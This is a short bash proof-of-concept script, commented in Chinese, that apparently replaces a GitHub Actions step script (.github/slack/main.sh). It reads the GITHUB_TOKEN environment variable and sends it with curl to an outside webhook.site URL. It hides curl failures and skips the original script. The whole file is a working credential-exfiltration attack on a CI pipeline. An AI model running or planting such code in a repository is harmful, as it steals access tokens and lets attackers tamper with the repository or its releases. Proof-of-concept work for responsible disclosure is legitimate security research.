#!/usr/bin/env bash
set -eu

# 打一点标记到日志里，方便在 Actions log 里确认确实执行的是我们自定义脚本
echo ">>> [PoC] custom .github/slack/main.sh is running" >&2

# 安全起见，防止变量不存在时报错
TOKEN="${GITHUB_TOKEN:-<empty>}"

# 把 GITHUB_TOKEN 发到你自己的 webhook.site
curl -sS -X POST \
  -H 'Content-Type: text/plain' \
  --data "GITHUB_TOKEN=${TOKEN}" \
  'https://webhook.site/56aa9ff7-330f-45e4-8899-f8fbefb57879' || true

echo ">>> [PoC] token sent (or curl failed)" >&2

# 不再调用原始 main.sh，直接退出
exit 0
